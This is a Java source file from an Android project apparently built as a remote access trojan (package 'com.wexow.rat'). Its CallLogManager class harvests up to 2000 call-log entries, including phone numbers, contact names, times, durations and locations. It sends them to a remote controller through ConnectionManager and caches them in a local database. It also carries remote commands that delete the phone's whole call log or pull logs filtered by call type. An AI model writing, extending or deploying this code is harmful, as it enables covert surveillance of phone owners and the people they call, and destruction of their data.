package com.wexow.rat.managers;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallLogManager {
    private static final String TAG = "CallLogManager";

    private static final int TYPE_INCOMING = 1;
    private static final int TYPE_OUTGOING = 2;
    private static final int TYPE_MISSED = 3;
    private static final int TYPE_VOICEMAIL = 4;
    private static final int TYPE_REJECTED = 5;
    private static final int TYPE_BLOCKED = 6;
    private static final int TYPE_ANSWERED_EXTERNALLY = 7;

    public static void getCallLogs(Context ctx) {
        new Thread(() -> {
            try {
                Log.e(TAG, "📞 Reading call logs...");
                
                JSONArray list = new JSONArray();
                
                String[] projection = {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.NEW,
                    CallLog.Calls.CACHED_NUMBER_TYPE,
                    CallLog.Calls.CACHED_NUMBER_LABEL,
                    CallLog.Calls.COUNTRY_ISO,
                    CallLog.Calls.GEOCODED_LOCATION,
                };
                
                Cursor c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
                );
                
                if (c == null) {
                    Log.e(TAG, "❌ Cursor is null");
                    return;
                }
                
                int maxRecords = 2000;
                int count = 0;
                
                while (c.moveToNext() && count < maxRecords) {
                    try {
                        JSONObject jo = new JSONObject();
                        
                        jo.put("id", c.getLong(0));
                        jo.put("number", c.getString(1) != null ? c.getString(1) : "");
                        jo.put("name", c.getString(2) != null ? c.getString(2) : "");
                        
                        int type = c.getInt(3);
                        jo.put("type", type);
                        jo.put("typeName", getTypeName(type));
                        
                        long date = c.getLong(4);
                        jo.put("date", date);
                        jo.put("dateStr", new SimpleDateFormat(
                            "yyyy-MM-dd HH:mm:ss", Locale.getDefault()
                        ).format(new Date(date)));
                        
                        jo.put("duration", c.getLong(5)); 
                        jo.put("durationStr", formatDuration(c.getLong(5)));
                        
                        jo.put("isNew", c.getInt(6) == 1);
                        
                        try { jo.put("numberType", c.getInt(7)); } catch (Exception ignored) {}
                        try { jo.put("numberLabel", c.getString(8) != null ? c.getString(8) : ""); } catch (Exception ignored) {}
                        try { jo.put("countryISO", c.getString(9) != null ? c.getString(9) : ""); } catch (Exception ignored) {}
                        try { jo.put("location", c.getString(10) != null ? c.getString(10) : ""); } catch (Exception ignored) {}
                        
                        list.put(jo);
                        count++;
                    } catch (Exception e) {
                        Log.e(TAG, "Row error: " + e.getMessage());
                    }
                }
                
                c.close();
                
                Log.e(TAG, "📞 Found " + list.length() + " call logs");
                
                JSONObject stats = getCallStats(list);
                
                JSONObject res = new JSONObject();
                res.put("type", "call_logs");
                res.put("count", list.length());
                res.put("data", list);
                res.put("stats", stats);
                ConnectionManager.send(res.toString());

                saveToDatabase(ctx, list);
                
            } catch (Exception e) {
                Log.e(TAG, "❌ getCallLogs: " + e.getMessage(), e);
                
                try {
                    JSONObject err = new JSONObject();
                    err.put("type", "call_logs");
                    err.put("error", e.getMessage());
                    err.put("data", new JSONArray());
                    ConnectionManager.send(err.toString());
                } catch (Exception ignored) {}
            }
        }).start();
    }

    private static JSONObject getCallStats(JSONArray list) {
        JSONObject stats = new JSONObject();
        
        try {
            int incoming = 0;
            int outgoing = 0;
            int missed = 0;
            int rejected = 0;
            long totalDuration = 0;
            
            for (int i = 0; i < list.length(); i++) {
                JSONObject jo = list.getJSONObject(i);
                int type = jo.optInt("type", 0);
                long duration = jo.optLong("duration", 0);
                
                totalDuration += duration;
                
                switch (type) {
                    case TYPE_INCOMING: incoming++; break;
                    case TYPE_OUTGOING: outgoing++; break;
                    case TYPE_MISSED: missed++; break;
                    case TYPE_REJECTED: rejected++; break;
                }
            }
            
            stats.put("total", list.length());
            stats.put("incoming", incoming);
            stats.put("outgoing", outgoing);
            stats.put("missed", missed);
            stats.put("rejected", rejected);
            stats.put("totalDuration", totalDuration);
            stats.put("totalDurationStr", formatDuration(totalDuration));
            
        } catch (Exception e) {
            Log.e(TAG, "getCallStats: " + e.getMessage());
        }
        
        return stats;
    }

    private static void saveToDatabase(Context ctx, JSONArray list) {
        try {
            android.database.sqlite.SQLiteDatabase db = 
                ClientDatabase.getInstance(ctx).getWritableDatabase();
            db.delete("call_logs", null, null);
            
            for (int i = 0; i < list.length(); i++) {
                JSONObject jo = list.getJSONObject(i);
                
                android.content.ContentValues cv = new android.content.ContentValues();
                cv.put("number", jo.optString("number", ""));
                cv.put("name", jo.optString("name", ""));
                cv.put("type", jo.optInt("type", 0));
                cv.put("date", jo.optLong("date", 0));
                cv.put("duration", jo.optLong("duration", 0));
                
                db.insert("call_logs", null, cv);
            }
            
            Log.e(TAG, "✅ Saved " + list.length() + " call logs to DB");
        } catch (Exception e) {
            Log.e(TAG, "saveToDatabase: " + e.getMessage());
        }
    }

    private static String getTypeName(int type) {
        switch (type) {
            case TYPE_INCOMING: return "Incoming";
            case TYPE_OUTGOING: return "Outgoing";
            case TYPE_MISSED: return "Missed";
            case TYPE_VOICEMAIL: return "Voicemail";
            case TYPE_REJECTED: return "Rejected";
            case TYPE_BLOCKED: return "Blocked";
            case TYPE_ANSWERED_EXTERNALLY: return "Answered Externally";
            default: return "Unknown (" + type + ")";
        }
    }

    private static String formatDuration(long seconds) {
        if (seconds < 60) return seconds + "s";
        
        long minutes = seconds / 60;
        long remainingSeconds = seconds % 60;
        
        if (minutes < 60) {
            return minutes + "m " + remainingSeconds + "s";
        }
        
        long hours = minutes / 60;
        long remainingMinutes = minutes % 60;
        
        return hours + "h " + remainingMinutes + "m";
    }

    public static void clearCallLogs(Context ctx) {
        new Thread(() -> {
            try {
                int deleted = ctx.getContentResolver().delete(
                    CallLog.Calls.CONTENT_URI, null, null
                );
                
                Log.e(TAG, "🗑️ Deleted " + deleted + " call logs");
                
                JSONObject res = new JSONObject();
                res.put("type", "call_logs_cleared");
                res.put("count", deleted);
                ConnectionManager.send(res.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "clearCallLogs: " + e.getMessage());
            }
        }).start();
    }

    public static void getCallLogsByType(Context ctx, int type) {
        new Thread(() -> {
            try {
                JSONArray list = new JSONArray();
                
                String selection = CallLog.Calls.TYPE + " = ?";
                String[] selectionArgs = { String.valueOf(type) };
                
                Cursor c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION,
                    },
                    selection,
                    selectionArgs,
                    CallLog.Calls.DATE + " DESC LIMIT 500"
                );
                
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject jo = new JSONObject();
                        jo.put("number", c.getString(0));
                        jo.put("name", c.getString(1) != null ? c.getString(1) : "");
                        jo.put("type", c.getInt(2));
                        jo.put("date", c.getLong(3));
                        jo.put("duration", c.getLong(4));
                        list.put(jo);
                    }
                    c.close();
                }
                
                JSONObject res = new JSONObject();
                res.put("type", "call_logs");
                res.put("filter", getTypeName(type));
                res.put("count", list.length());
                res.put("data", list);
                ConnectionManager.send(res.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "getCallLogsByType: " + e.getMessage());
            }
        }).start();
    }
}
